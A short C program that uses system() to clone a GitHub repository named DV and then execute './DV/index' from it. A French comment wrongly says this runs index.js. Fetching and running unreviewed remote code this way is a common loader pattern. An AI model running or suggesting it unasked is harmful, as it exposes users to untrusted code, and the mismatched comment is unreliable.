#include <stdlib.h>
#include <unistd.h>

int main() {
    system("git clone https://github.com/akablimustapha/DV.git");
    system("./DV/index");  // Exécute le fichier index.js (assurez-vous que le fichier a les permissions d'exécution)
    return 0;
}


